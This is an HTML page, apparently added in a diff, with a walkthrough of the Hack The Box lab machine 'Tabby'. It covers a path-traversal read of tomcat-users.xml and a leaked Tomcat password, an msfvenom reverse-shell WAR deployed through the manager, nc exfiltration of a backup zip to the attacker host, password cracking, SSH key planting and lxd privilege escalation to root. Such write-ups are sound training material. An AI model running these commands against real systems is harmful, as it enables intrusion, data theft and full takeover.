@@ -1,0 +1,298 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Tabby</h1>
+    <p class="text">Difficulty : Easy | UserDifficulty 4.8</p>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV $IP --min-rate=10000</u>
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
+|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
+|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Mega Hosting
+8080/tcp open  http    Apache Tomcat
+|_http-title: Apache Tomcat
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+
+
+<p class="text">Two HTTP pages are open on the target machine. I'll start with port 80.</p>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/tabby/1.png' %}" alt="">
+    <p class="text">There are several pages we can visit. Before using enum tools like gobuster, it's important to browse asccessable pages ourselves.</p>
+</div>
+
+<p class="text">When I opened News page, the domain name megahosting.htb is returned. Let's add this to /etc/hosts.</p>
+
+<div class="code-box"><pre><code>└─$ echo 'IP megahosting.htb' | sudo tee -a /etc/hosts</code></pre></div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/tabby/2.png' %}" alt="">
+    <p class="text">Glancing at the url, the parameter <u>file=</u> is used to indicate file to parse. We may exploit LFI vulnerabilty.</p>
+</div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/tabby/3.png' %}" alt="">
+    <p class="text">With testing multiple pattern for LFI, I successfully extracted /etc/passwd page. However, I couldn't get id_rsa of the local user ash. Therefore, we have to find another vector for reverse shell.</p>
+</div>
+
+<div class="code-box"><pre><code>└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$IP -t 70
+===============================================================
+/assets               (Status: 301) [Size: 315] [--&gt; http://10.129.79.191/assets/]
+/.htpasswd            (Status: 403) [Size: 278]
+/.htaccess            (Status: 403) [Size: 278]
+/.hta                 (Status: 403) [Size: 278]
+/favicon.ico          (Status: 200) [Size: 766]
+/files                (Status: 301) [Size: 314] [--&gt; http://10.129.79.191/files/]
+/index.php            (Status: 200) [Size: 14175]
+/server-status        (Status: 403) [Size: 278]
+
+===============================================================</code></pre></div>
+
+<p class="text">There is an interesting directory named 'files'. Let's enumerate further.</p>
+
+
+<div class="code-box"><pre><code>└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$IP/files -t 70
+===============================================================
+/.htaccess            (Status: 403) [Size: 278]
+/archive              (Status: 301) [Size: 322] [--&lt; http://10.129.79.191/files/archive/]
+/.htpasswd            (Status: 403) [Size: 278]
+/.hta                 (Status: 403) [Size: 278]
+/statement            (Status: 200) [Size: 6507]
+
+===============================================================</code></pre></div>
+
+<p class="text">It returned new directory 'archive'. An another dir 'statement' probably the file set to file parameter we saw before.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/tabby/4.png' %}" alt="">
+    <p class="text">However, there is no output if I set the parameter to archive. I took a note about it and move on to further enum.</p>
+</div>
+
+<p class="text">Because there is no extra directories I might have to enumerate, port 8080 is the next target.</p>
+
+
+<h2 class="subtitle">Foothold</h2>
+<div class="img">
+    <img src="{% static 'EthHack/images/tabby/5.png' %}" alt="">
+    <p class="text">Opening 8080 revealed additional information. It says 'The host-manager webapp is restricted to users with role "admin-gui". Users are defined in <u>/etc/tomcat9/tomcat-users.xml</u>.' <br><br>We may be able to get tomcat admin credential if we could find this file.</p>
+</div>
+
+<p class="text">Because we know there is LFI vulnerability, we can read the tomcat-users.txt.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/tabby/6.png' %}" alt="">
+    <p class="text">However, the page doesn't return texts of the config file. The file path may not accurate.</p>
+</div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/tabby/7.png' %}" alt="">
+    <p class="text">According to <a href="https://askubuntu.com/questions/135824/what-is-the-tomcat-installation-directory">this</a> page, the <u>/usr/share/tomcat9</u> is the path tomcat is instaled. However, we don't know where the tomcat-users/txt stored. Therefore, we need further research.</p>
+</div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/tabby/8.png' %}" alt="">
+    <p class="text">Using google research option, the keyword <u>intext:/usr/share/tomcat9 intext:tomcat-users.xml intitle:debian</u> returned <a href="https://packages.debian.org/bullseye/all/tomcat9/filelist">this</a> page. It was really frustrating time.</p>
+</div>
+
+<p class="text">According to this page, the path /usr/share/tomcat9/etc/tomcat-users.xml may includes the credentials. Let's see.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/tabby/9.png' %}" alt="">
+    <p class="text">Pressing the ctrl+U on the url <u>http://megahosting.htb/news.php?file=/../../../../../usr/share/tomcat9/etc/tomcat-users.xml</u> finally returned file tomcat-users.xml.</p>
+</div>
+
+<p class="text">We got plaintext password <u>$3cureP4s5w0rd123!</u> and username tomcat.</p>
+
+<p class="text">Then, we've obtained tomcat credential. Next step is enumerating the 8080 directories and find the way to get reverse shell.</p>
+
+
+<div class="code-box"><pre><code>└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://megahosting.htb:8080/ -t 70    
+===============================================================
+/docs                 (Status: 302) [Size: 0] [--&gt; /docs/]
+/examples             (Status: 302) [Size: 0] [--&gt; /examples/]
+/host-manager         (Status: 302) [Size: 0] [--&gt; /host-manager/]
+/index.html           (Status: 200) [Size: 1895]
+/manager              (Status: 302) [Size: 0] [--&gt; /manager/]
+
+===============================================================</code></pre></div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/tabby/10.png' %}" alt="">
+    <p class="text">Accessing /host-manager page requires cretential. We can use credential we got before.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/tabby/11.png' %}" alt="">
+    <p class="text">Though we could enter, there is no exploitable stuff. We need further enumeration probably.</p>
+</div>
+
+<div class="code-box"><pre><code>└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://megahosting.htb:8080/manager -t 70
+===============================================================
+/html                 (Status: 401) [Size: 2499]
+/images               (Status: 302) [Size: 0] [--&gt; /manager/images/]
+/status               (Status: 401) [Size: 2499]
+/status/ready         (Status: 401) [Size: 2499]
+<u>/text</u>             (Status: 401) [Size: 2499]
+
+===============================================================</code></pre></div>
+
+<p class="text">On the /manager dir, I found /text directory.</p>
+
+<div class="img">    
+    <img src="{% static 'EthHack/images/tabby/12.png' %}" alt="">
+    <p class="text">Opening this page returned <u>FAIL - Unknown command [/]</u>, which implies there are command we can use. It might be worth further researching.</p>
+</div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/tabby/13.png' %}" alt="">
+    <p class="text">According to <a href="https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html">tomcat9 official documentation</a>, we can deploy new page remotely. Common tomcat page is hosting with war file. Therefore, we might be able to get reverse shell if we could upload malicious war file. Let's try it.</p>
+</div>
+
+<p class="text">I use msfvenom to generate malicious war file.</p>
+<div class="code-box"><pre><code>└─$ msfvenom -p java/shell_reverse_tcp lhost=10.10.16.40 lport=4444 -f war -o rev.war
+Payload size: 13027 bytes
+Final size of war file: 13027 bytes
+Saved as: rev.war</code></pre></div>
+
+<p class="text">Then, upload it using curl command.</p>
+<div class="code-box"><pre><code>└─$ curl -u 'tomcat:$3cureP4s5w0rd123!' http://megahosting.htb:8080/manager/text/deploy?path=/rev --upload-file rev.war
+OK - Deployed application at context path [/rev]</code></pre></div>
+
+<p class="text">Output indicate we successfully uploaded the war file. Once we access to the new dir we named <u>/rev</u>, reverse shell would be come back.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/WEB-INF/classes/metasploit]
+└─$ curl -u 'tomcat:$3cureP4s5w0rd123!' http://megahosting.htb:8080/rev
+
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.40] from (UNKNOWN) [10.129.79.191] 49062
+id
+uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)</code></pre></div>
+
+<p class="text">We got tomcat user.</p>
+
+
+<h2 class="subtitle">Lateral Movement</h2>
+<p class="text">After stabilizing reverse shell with <u>script /dev/null -c /bin/bash</u>, I visited to <u>/var/www/html/files</u> to see the file <u>archive</u> we couldn't read before. However, I found another interesting file 16162020_backup.zip. </p>
+
+<div class="code-box"><pre><code>tomcat@tabby:/var/www/html/files$ unzip 16162020_backup.zip
+Archive:  16162020_backup.zip
+checkdir error:  cannot create var
+                 Read-only file system
+                 unable to process var/www/html/assets/.
+[16162020_backup.zip] var/www/html/favicon.ico password: </code></pre></div>
+
+<p class="text">However, when I tried to open this zip file, it required password. Therefore, I will copy this file to my local machine and crack password.</p>
+
+<div class="code-box"><pre><code>tomcat@tabby:/var/www/html/files$ cat 16162020_backup.zip | nc 10.10.16.40 4444
+
+└─$ nc -lvnp 4444 > backup.zip
+listening on [any] 4444 ...
+connect to [10.10.16.40] from (UNKNOWN) [10.129.79.191] 49134</code></pre></div>
+
+<p class="text">I could copy zip file to my kali. Next step is cracking the password.</p>
+
+<div class="code-box"><pre><code>└─$ zip2john backup.zip > backup.zip.john
+└─$ john backup.zip.john -w /usr/share/wordlists/rockyou.txt
+....
+└─$ john backup.zip.john --show
+backup.zip:<u>admin@it</u>::backup.zip:var/www/html/news.php, var/www/html/favicon.ico, var/www/html/Readme.txt, var/www/html/logo.png, var/www/html/index.php:backup.zip</code></pre></div>
+
+<p class="text">Though there is no interesting info in unziped file, I could use this password for lateral movement to ash user.</p>
+
+<div class="code-box"><pre><code>tomcat@tabby:/var/www/html/files$ su ash      
+Password: admin@it
+ash@tabby:/var/www/html/files$ </code></pre></div>
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">Before move on, let's change this connection into ssh.</p>
+<div class="code-box"><pre><code>└─$ ssh-keygen
+...
+└─$ cd ~/.ssh
+└─$ cat ******.pub</code></pre></div>
+<p class="text">Copy the output, and paste to target's ~/.ssh/authorized_keys. Because there is no .ssh dir on the target machine, we can create it.</p>
+<div class="code-box"><pre><code>ash@tabby:~$ mkdir .ssh
+ash@tabby:~$ cd .ssh
+ash@tabby:~$ echo '<u>output</u>' > authorized_keys</code></pre></div>
+
+<p class="text">We can then connect to the target machine with ssh.</p>
+
+<div class="code-box"><pre><code>└─$ ssh -i ~/.ssh/**_******* ash@megahosting.htb <u class="green">#Use rsa file not public one(****.pub file)</u>
+...
+ash@tabby:~$ ls</code></pre></div>
+
+<p class="text"><u>※Big Notion : You might not be able to use command for PrivEsc without ssh connection.</u></p>
+
+<p class="text">While enumerating user info, I found a famous privilege escalation vector.</p>
+<div class="code-box"><pre><code>ash@tabby:/var/www/html/files$ groups
+ash adm cdrom dip plugdev <u>lxd</u></code></pre></div>
+
+<p class="text">This lxd is container tool. It can be used to run isolated Linux distributions, for development and testing environments, and for deploying containerized applications.</p>
+<p class="text">This means, we can take snapshot of root directory and ses arbitrary file with root privilege in the container.</p>
+<p class="text">I found <a href="https://steflan-security.com/linux-privilege-escalation-exploiting-the-lxc-lxd-groups/">great article</a>, so I will follow this instruction.</p>
+
+
+<p class="text">First, I download lxd-alpine-builder from .git and build it on my own machine.</p>
+
+<div class="code-box"><pre><code>└─$ git clone https://github.com/saghul/lxd-alpine-builder
+└─$ cd lxd-alpine-builder/
+└─$ sudo ./build-alpine
+└─$ mv alpine-v3.13-x86_64-20210218_0139.tar.gz alpine.tar.gz <u class="green">#For usability, I renamed generated gz file. It's discretionary.</u></code></pre></div>
+
+<p class="text">Then, upload generated file to target machine.</p>
+
+<div class="code-box"><pre><code>└─$ <u>python3 -m http.server 8000  </u>               
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.129.79.191 - - [23/Oct/2025 06:21:42] "GET /alpine.tar.gz HTTP/1.1" 200 -
+
+
+ash@tabby:~$ <u>wget http://10.10.16.40:8000/alpine.tar.gz</u>
+--2025-10-23 10:21:44--  http://10.10.16.40:8000/alpine.tar.gz
+Connecting to 10.10.16.40:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3259593 (3.1M) [application/gzip]
+Saving to: 'alpine.tar.gz'
+
+alpine.tar.gz         0%[                    ]       0  -alpine.tar.gz         1%[                    ]  39.08K   alpine.tar.gz         5%[>                   ] 187.76K   alpine.tar.gz        10%[=>                  ] 327.34K   alpine.tar.gz        15%[==>                 ] 483.48K   alpine.tar.gz        22%[===>                ] 707.55K   alpine.tar.gz        28%[====>               ] 904.45K   alpine.tar.gz        36%[======>             ]   1.12M   alpine.tar.gz        41%[=======>            ]   1.29M   alpine.tar.gz        51%[=========>          ]   1.60M   alpine.tar.gz        60%[===========>        ]   1.87M   alpine.tar.gz        72%[=============>      ]   2.24M   alpine.tar.gz        82%[===============>    ]   2.56M   alpine.tar.gz        94%[=================>  ]   2.94M  1alpine.tar.gz       100%[===================>]   3.11M  1.05MB/s    in 3.0s    
+
+2025-10-23 10:21:47 (1.05 MB/s) - 'alpine.tar.gz' saved [3259593/3259593]</code></pre></div>
+
+
+
+
+<div class="code-box"><pre><code>ash@tabby:~$ lxc image import ./alpine.tar.gz --alias myimage 
+
+If this is your first time running LXD on this machine, you should also run: lxd init
+To start your first instance, try: lxc launch ubuntu:18.04
+
+ash@tabby:~$ lxd init <u class="green">#You can leave all options empty and simply press Enter.</u>
+ash@tabby:~$ lxc init myimage mycontainer -c security.privileged=true 
+ash@tabby:~$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true 
+ash@tabby:~$ lxc start mycontainer
+ash@tabby:~$ lxc exec mycontainer /bin/sh
+~ # id
+uid=0(root) gid=0(root)</code></pre></div>
+
+<p class="text">We got root user. You can find root.txt on <u>/mnt/root/root dir</u>.</p>
+
+
+</body>
+</html>
